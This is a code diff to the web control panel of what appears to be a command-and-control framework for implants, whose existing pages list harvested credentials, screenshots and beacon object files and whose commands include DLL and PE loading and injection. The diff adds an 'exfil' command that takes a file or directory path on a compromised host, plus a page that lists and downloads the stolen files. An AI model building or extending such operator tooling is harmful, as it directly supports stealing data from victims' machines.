@@ -1113,6 +1113,7 @@ input[type="checkbox"]:hover:not(:disabled) {
       <div class="nav-item" data-page="results">results</div>
       <div class="nav-item" data-page="credentials">credentials</div>
       <div class="nav-item" data-page="screenshots">screenshots</div>
+      <div class="nav-item" data-page="exfil">exfil</div>
     </nav>
 
     <div class="content">
@@ -1245,6 +1246,27 @@ input[type="checkbox"]:hover:not(:disabled) {
         <div class="screenshot-grid" id="screenshotGrid"></div>
       </div>
 
+      <!-- exfil page -->
+      <div class="page" id="page-exfil">
+        <h1 class="page-title">exfiltrated files</h1>
+        <div class="action-bar">
+          <button class="action-btn" onclick="refreshExfil()">refresh</button>
+        </div>
+        <div class="table-container">
+          <table>
+            <thead>
+              <tr>
+                <th>filename</th>
+                <th>size</th>
+                <th>date</th>
+                <th>actions</th>
+              </tr>
+            </thead>
+            <tbody id="exfilTable"></tbody>
+          </table>
+        </div>
+      </div>
+
       <!-- bofs page -->
       <div class="page" id="page-bofs">
         <h1 class="page-title">beacon object files</h1>
@@ -1370,6 +1392,7 @@ input[type="checkbox"]:hover:not(:disabled) {
             <option value="load_dll">load_dll</option>
             <option value="load_pe">load_pe</option>
             <option value="inject_dll">inject_dll</option>
+            <option value="exfil">exfil</option>
           </select>
           <input type="text" class="command-input" id="commandArgs" placeholder="arguments (optional)">
           <button class="command-btn" onclick="sendCommand()">execute</button>
@@ -1506,6 +1529,7 @@ async function loadData() {
     loadAllResults(),
     loadBOFs(),
     loadScreenshots(),
+    loadExfil(),
     updateShellcodeImplantSelect()
   ]);
 
@@ -2509,13 +2533,16 @@ document.getElementById('commandType').addEventListener('change', async function
       argsInput.value = '';
       argsInput.placeholder = '<pid|process.exe> <url>';
       break;
+    case 'exfil':
+      argsInput.value = '';
+      argsInput.placeholder = 'path to exfiltrate (file or directory)';
+      break;
     default:
       argsInput.value = '';
       argsInput.placeholder = 'arguments (optional)';
   }
 });
 
-// keyboard shortcuts
 document.addEventListener('keydown', e => {
   if (e.key === 'Escape') {
     closeDetail();
@@ -2531,6 +2558,36 @@ function copyToClipboard(text, btn) {
     btn.textContent = 'copied!';
     setTimeout(() => btn.textContent = orig, 1000);
   });
+}
+
+// exfil
+async function loadExfil() {
+  const files = await api('/exfil') || [];
+  const tbody = document.getElementById('exfilTable');
+  
+  if (files.length === 0) {
+    tbody.innerHTML = '<tr><td colspan="4" style="text-align:center;color:var(--text-dim);padding:40px"><div style="margin-bottom:8px">no exfiltrated files</div></td></tr>';
+    return;
+  }
+
+  // Sort by date desc
+  files.sort((a, b) => new Date(b.created) - new Date(a.created));
+
+  tbody.innerHTML = files.map(f => ` + "`" + `
+    <tr>
+      <td>${f.name}</td>
+      <td>${formatSize(f.size)}</td>
+      <td>${formatTime(f.created)}</td>
+      <td>
+        <a href="/api/exfil/${f.name}" target="_blank" class="action-btn" style="text-decoration:none">download</a>
+      </td>
+    </tr>
+  ` + "`" + `).join('');
+}
+
+function refreshExfil() {
+  loadExfil();
+  toast('refreshed exfil list', 'success');
 }
 
 // init
